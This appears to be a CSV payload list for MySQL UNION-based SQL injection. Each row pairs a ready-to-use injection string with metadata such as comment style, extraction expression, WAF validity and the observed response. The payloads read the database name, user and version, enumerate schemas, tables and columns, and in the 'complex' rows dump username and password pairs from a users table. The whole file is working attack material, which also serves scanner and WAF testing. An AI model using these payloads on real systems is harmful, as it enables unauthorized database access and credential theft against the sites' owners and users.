payload_id,payload,injection_type,tier,context,columns,comment_style,marker_column_left,marker_column_right,extraction_expr,union_keyword,error_function,valid_without_waf,status_code,response_len,notes
u0109,"-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",union,trivial,single_quote,3,dash,2,3,database(),plain,,yes,200,726,
u0110,"-1' UNION ALL SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",union,trivial,single_quote,3,dash,2,3,database(),all,,yes,200,726,
u0111,"-1' UNION DISTINCT SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",union,trivial,single_quote,3,dash,2,3,database(),distinct,,yes,200,726,
u0112,"-1' UNION DISTINCTROW SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",union,trivial,single_quote,3,dash,2,3,database(),distinctrow,,yes,200,726,
u0113,"-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'#",union,trivial,single_quote,3,hash,2,3,database(),plain,,yes,200,726,
u0114,"-1' UNION ALL SELECT database(),'SEQSQLI_START','SEQSQLI_END'#",union,trivial,single_quote,3,hash,2,3,database(),all,,yes,200,726,
u0115,"-1' UNION DISTINCT SELECT database(),'SEQSQLI_START','SEQSQLI_END'#",union,trivial,single_quote,3,hash,2,3,database(),distinct,,yes,200,726,
u0116,"-1' UNION DISTINCTROW SELECT database(),'SEQSQLI_START','SEQSQLI_END'#",union,trivial,single_quote,3,hash,2,3,database(),distinctrow,,yes,200,726,
u0117,"-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'--+",union,trivial,single_quote,3,dashplus,2,3,database(),plain,,yes,200,726,
u0118,"-1' UNION ALL SELECT database(),'SEQSQLI_START','SEQSQLI_END'--+",union,trivial,single_quote,3,dashplus,2,3,database(),all,,yes,200,726,
u0119,"-1' UNION DISTINCT SELECT database(),'SEQSQLI_START','SEQSQLI_END'--+",union,trivial,single_quote,3,dashplus,2,3,database(),distinct,,yes,200,726,
u0120,"-1' UNION DISTINCTROW SELECT database(),'SEQSQLI_START','SEQSQLI_END'--+",union,trivial,single_quote,3,dashplus,2,3,database(),distinctrow,,yes,200,726,
u0121,"-1' UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'-- -",union,trivial,single_quote,3,dash,2,3,user(),plain,,yes,200,726,
u0122,"-1' UNION ALL SELECT user(),'SEQSQLI_START','SEQSQLI_END'-- -",union,trivial,single_quote,3,dash,2,3,user(),all,,yes,200,726,
u0123,"-1' UNION DISTINCT SELECT user(),'SEQSQLI_START','SEQSQLI_END'-- -",union,trivial,single_quote,3,dash,2,3,user(),distinct,,yes,200,726,
u0124,"-1' UNION DISTINCTROW SELECT user(),'SEQSQLI_START','SEQSQLI_END'-- -",union,trivial,single_quote,3,dash,2,3,user(),distinctrow,,yes,200,726,
u0125,"-1' UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'#",union,trivial,single_quote,3,hash,2,3,user(),plain,,yes,200,726,
u0126,"-1' UNION ALL SELECT user(),'SEQSQLI_START','SEQSQLI_END'#",union,trivial,single_quote,3,hash,2,3,user(),all,,yes,200,726,
u0127,"-1' UNION DISTINCT SELECT user(),'SEQSQLI_START','SEQSQLI_END'#",union,trivial,single_quote,3,hash,2,3,user(),distinct,,yes,200,726,
u0128,"-1' UNION DISTINCTROW SELECT user(),'SEQSQLI_START','SEQSQLI_END'#",union,trivial,single_quote,3,hash,2,3,user(),distinctrow,,yes,200,726,
u0129,"-1' UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'--+",union,trivial,single_quote,3,dashplus,2,3,user(),plain,,yes,200,726,
u0130,"-1' UNION ALL SELECT user(),'SEQSQLI_START','SEQSQLI_END'--+",union,trivial,single_quote,3,dashplus,2,3,user(),all,,yes,200,726,
u0131,"-1' UNION DISTINCT SELECT user(),'SEQSQLI_START','SEQSQLI_END'--+",union,trivial,single_quote,3,dashplus,2,3,user(),distinct,,yes,200,726,
u0132,"-1' UNION DISTINCTROW SELECT user(),'SEQSQLI_START','SEQSQLI_END'--+",union,trivial,single_quote,3,dashplus,2,3,user(),distinctrow,,yes,200,726,
u0133,"-1' UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'-- -",union,trivial,single_quote,3,dash,2,3,version(),plain,,yes,200,726,
u0134,"-1' UNION ALL SELECT version(),'SEQSQLI_START','SEQSQLI_END'-- -",union,trivial,single_quote,3,dash,2,3,version(),all,,yes,200,726,
u0135,"-1' UNION DISTINCT SELECT version(),'SEQSQLI_START','SEQSQLI_END'-- -",union,trivial,single_quote,3,dash,2,3,version(),distinct,,yes,200,726,
u0136,"-1' UNION DISTINCTROW SELECT version(),'SEQSQLI_START','SEQSQLI_END'-- -",union,trivial,single_quote,3,dash,2,3,version(),distinctrow,,yes,200,726,
u0137,"-1' UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'#",union,trivial,single_quote,3,hash,2,3,version(),plain,,yes,200,726,
u0138,"-1' UNION ALL SELECT version(),'SEQSQLI_START','SEQSQLI_END'#",union,trivial,single_quote,3,hash,2,3,version(),all,,yes,200,726,
u0139,"-1' UNION DISTINCT SELECT version(),'SEQSQLI_START','SEQSQLI_END'#",union,trivial,single_quote,3,hash,2,3,version(),distinct,,yes,200,726,
u0140,"-1' UNION DISTINCTROW SELECT version(),'SEQSQLI_START','SEQSQLI_END'#",union,trivial,single_quote,3,hash,2,3,version(),distinctrow,,yes,200,726,
u0141,"-1' UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'--+",union,trivial,single_quote,3,dashplus,2,3,version(),plain,,yes,200,726,
u0142,"-1' UNION ALL SELECT version(),'SEQSQLI_START','SEQSQLI_END'--+",union,trivial,single_quote,3,dashplus,2,3,version(),all,,yes,200,726,
u0143,"-1' UNION DISTINCT SELECT version(),'SEQSQLI_START','SEQSQLI_END'--+",union,trivial,single_quote,3,dashplus,2,3,version(),distinct,,yes,200,726,
u0144,"-1' UNION DISTINCTROW SELECT version(),'SEQSQLI_START','SEQSQLI_END'--+",union,trivial,single_quote,3,dashplus,2,3,version(),distinctrow,,yes,200,726,
u0145,"-1' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'-- -",union,medium,single_quote,3,dash,2,3,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),plain,,yes,200,726,
u0146,"-1' UNION ALL SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'-- -",union,medium,single_quote,3,dash,2,3,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),all,,yes,200,726,
u0147,"-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'-- -",union,medium,single_quote,3,dash,2,3,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),distinct,,yes,200,726,
u0148,"-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'-- -",union,medium,single_quote,3,dash,2,3,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),distinctrow,,yes,200,726,
u0149,"-1' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'#",union,medium,single_quote,3,hash,2,3,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),plain,,yes,200,726,
u0150,"-1' UNION ALL SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'#",union,medium,single_quote,3,hash,2,3,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),all,,yes,200,726,
u0151,"-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'#",union,medium,single_quote,3,hash,2,3,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),distinct,,yes,200,726,
u0152,"-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'#",union,medium,single_quote,3,hash,2,3,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),distinctrow,,yes,200,726,
u0153,"-1' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'--+",union,medium,single_quote,3,dashplus,2,3,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),plain,,yes,200,726,
u0154,"-1' UNION ALL SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'--+",union,medium,single_quote,3,dashplus,2,3,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),all,,yes,200,726,
u0155,"-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'--+",union,medium,single_quote,3,dashplus,2,3,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),distinct,,yes,200,726,
u0156,"-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'--+",union,medium,single_quote,3,dashplus,2,3,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),distinctrow,,yes,200,726,
u0157,"-1' UNION SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'-- -",union,medium,single_quote,3,dash,2,3,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),plain,,yes,200,726,
u0158,"-1' UNION ALL SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'-- -",union,medium,single_quote,3,dash,2,3,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),all,,yes,200,726,
u0159,"-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'-- -",union,medium,single_quote,3,dash,2,3,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),distinct,,yes,200,726,
u0160,"-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'-- -",union,medium,single_quote,3,dash,2,3,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),distinctrow,,yes,200,726,
u0161,"-1' UNION SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'#",union,medium,single_quote,3,hash,2,3,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),plain,,yes,200,726,
u0162,"-1' UNION ALL SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'#",union,medium,single_quote,3,hash,2,3,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),all,,yes,200,726,
u0163,"-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'#",union,medium,single_quote,3,hash,2,3,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),distinct,,yes,200,726,
u0164,"-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'#",union,medium,single_quote,3,hash,2,3,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),distinctrow,,yes,200,726,
u0165,"-1' UNION SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'--+",union,medium,single_quote,3,dashplus,2,3,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),plain,,yes,200,726,
u0166,"-1' UNION ALL SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'--+",union,medium,single_quote,3,dashplus,2,3,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),all,,yes,200,726,
u0167,"-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'--+",union,medium,single_quote,3,dashplus,2,3,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),distinct,,yes,200,726,
u0168,"-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'--+",union,medium,single_quote,3,dashplus,2,3,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),distinctrow,,yes,200,726,
u0169,"-1' UNION SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'-- -",union,medium,single_quote,3,dash,2,3,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),plain,,yes,200,726,
u0170,"-1' UNION ALL SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'-- -",union,medium,single_quote,3,dash,2,3,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),all,,yes,200,726,
u0171,"-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'-- -",union,medium,single_quote,3,dash,2,3,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),distinct,,yes,200,726,
u0172,"-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'-- -",union,medium,single_quote,3,dash,2,3,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),distinctrow,,yes,200,726,
u0173,"-1' UNION SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'#",union,medium,single_quote,3,hash,2,3,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),plain,,yes,200,726,
u0174,"-1' UNION ALL SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'#",union,medium,single_quote,3,hash,2,3,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),all,,yes,200,726,
u0175,"-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'#",union,medium,single_quote,3,hash,2,3,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),distinct,,yes,200,726,
u0176,"-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'#",union,medium,single_quote,3,hash,2,3,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),distinctrow,,yes,200,726,
u0177,"-1' UNION SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'--+",union,medium,single_quote,3,dashplus,2,3,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),plain,,yes,200,726,
u0178,"-1' UNION ALL SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'--+",union,medium,single_quote,3,dashplus,2,3,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),all,,yes,200,726,
u0179,"-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'--+",union,medium,single_quote,3,dashplus,2,3,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),distinct,,yes,200,726,
u0180,"-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'--+",union,medium,single_quote,3,dashplus,2,3,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),distinctrow,,yes,200,726,
u0181,"-1' UNION SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'-- -",union,complex,single_quote,3,dash,2,3,"(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)",plain,,yes,200,726,
u0182,"-1' UNION ALL SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'-- -",union,complex,single_quote,3,dash,2,3,"(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)",all,,yes,200,726,
u0183,"-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'-- -",union,complex,single_quote,3,dash,2,3,"(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)",distinct,,yes,200,726,
u0184,"-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'-- -",union,complex,single_quote,3,dash,2,3,"(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)",distinctrow,,yes,200,726,
u0185,"-1' UNION SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'#",union,complex,single_quote,3,hash,2,3,"(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)",plain,,yes,200,726,
u0186,"-1' UNION ALL SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'#",union,complex,single_quote,3,hash,2,3,"(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)",all,,yes,200,726,
u0187,"-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'#",union,complex,single_quote,3,hash,2,3,"(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)",distinct,,yes,200,726,
u0188,"-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'#",union,complex,single_quote,3,hash,2,3,"(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)",distinctrow,,yes,200,726,
u0189,"-1' UNION SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'--+",union,complex,single_quote,3,dashplus,2,3,"(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)",plain,,yes,200,726,
u0190,"-1' UNION ALL SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'--+",union,complex,single_quote,3,dashplus,2,3,"(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)",all,,yes,200,726,
u0191,"-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'--+",union,complex,single_quote,3,dashplus,2,3,"(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)",distinct,,yes,200,726,
u0192,"-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'--+",union,complex,single_quote,3,dashplus,2,3,"(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)",distinctrow,,yes,200,726,
u0193,"-1' UNION SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'-- -",union,complex,single_quote,3,dash,2,3,"(SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61))",plain,,yes,200,726,
u0194,"-1' UNION ALL SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'-- -",union,complex,single_quote,3,dash,2,3,"(SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61))",all,,yes,200,726,
u0195,"-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'-- -",union,complex,single_quote,3,dash,2,3,"(SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61))",distinct,,yes,200,726,
u0196,"-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'-- -",union,complex,single_quote,3,dash,2,3,"(SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61))",distinctrow,,yes,200,726,
u0197,"-1' UNION SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'#",union,complex,single_quote,3,hash,2,3,"(SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61))",plain,,yes,200,726,
u0198,"-1' UNION ALL SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'#",union,complex,single_quote,3,hash,2,3,"(SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61))",all,,yes,200,726,
u0199,"-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'#",union,complex,single_quote,3,hash,2,3,"(SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61))",distinct,,yes,200,726,
u0200,"-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'#",union,complex,single_quote,3,hash,2,3,"(SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61))",distinctrow,,yes,200,726,
u0201,"-1' UNION SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'--+",union,complex,single_quote,3,dashplus,2,3,"(SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61))",plain,,yes,200,726,
u0202,"-1' UNION ALL SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'--+",union,complex,single_quote,3,dashplus,2,3,"(SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61))",all,,yes,200,726,
u0203,"-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'--+",union,complex,single_quote,3,dashplus,2,3,"(SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61))",distinct,,yes,200,726,
u0204,"-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'--+",union,complex,single_quote,3,dashplus,2,3,"(SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61))",distinctrow,,yes,200,726,
u0205,"-1' UNION SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'-- -",union,complex,single_quote,3,dash,2,3,"(SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE())",plain,,yes,200,726,
u0206,"-1' UNION ALL SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'-- -",union,complex,single_quote,3,dash,2,3,"(SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE())",all,,yes,200,726,
u0207,"-1' UNION DISTINCT SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'-- -",union,complex,single_quote,3,dash,2,3,"(SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE())",distinct,,yes,200,726,
u0208,"-1' UNION DISTINCTROW SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'-- -",union,complex,single_quote,3,dash,2,3,"(SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE())",distinctrow,,yes,200,726,
u0209,"-1' UNION SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'#",union,complex,single_quote,3,hash,2,3,"(SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE())",plain,,yes,200,726,
